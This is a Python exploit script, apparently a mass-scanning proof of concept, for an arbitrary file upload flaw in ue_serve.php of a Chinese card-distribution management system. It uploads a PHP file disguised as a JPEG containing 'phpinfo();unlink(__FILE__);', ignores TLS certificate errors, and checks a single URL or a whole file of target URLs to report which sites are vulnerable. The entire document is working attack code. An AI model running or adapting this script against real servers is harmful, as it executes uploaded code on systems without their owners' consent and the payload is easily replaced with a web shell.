import requests
import argparse
import os
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress only the InsecureRequestWarning from urllib3
warnings.simplefilter('ignore', InsecureRequestWarning)

def create_multipart_form_data():
    boundary = '----WebKitFormBoundarylkv1kpsZgzw2WC03'
    multipart_data = (
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="name"\r\n\r\n'
        '404.php\r\n'
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="upfile"; filename="404.php"\r\n'
        'Content-Type: image/jpeg\r\n\r\n'
        '<?php phpinfo();unlink(__FILE__);?>\r\n'
        f'--{boundary}--\r\n'
    ).encode('utf-8')  # Ensure this is encoded as bytes
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    return multipart_data, headers

def check_vulnerability(url):
    data, headers = create_multipart_form_data()
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10, verify=False)
        if response.status_code == 200 and 'SUCCESS' in response.text:
            print(f"{url} 存在号卡极团分销管理系统 ue_serve.php 任意文件上传漏洞")
            return True
        else:
            print(f"{url} 不存在漏洞: HTTP {response.status_code}")
            #print(response.text)  # Print the response to help with debugging
            return False
    except requests.exceptions.RequestException as e:
        print(f"访问 {url} 出错: {e}")
        return False

def batch_check_vulnerability(url_list):
    for url in url_list:
        url = url.strip()
        if not url.startswith('http'):
            url = 'http://' + url
        if not url.endswith('/'):
            url += '/'
        url_to_check = url + 'admin/controller/ue_serve.php?action=image&encode=utf-8'
        check_vulnerability(url_to_check)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='批量检测ue_serve.php任意文件上传漏洞')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='目标URL')
    group.add_argument('-f', '--file', help='包含多个URL的TXT文件')

    args = parser.parse_args()

    if args.url:
        url_list = [args.url]
    else:
        if not os.path.isfile(args.file):
            print(f"文件 {args.file} 不存在")
            exit(1)
        with open(args.file, 'r', encoding='utf-8') as file:  # Ensure correct encoding
            url_list = file.readlines()

    batch_check_vulnerability(url_list)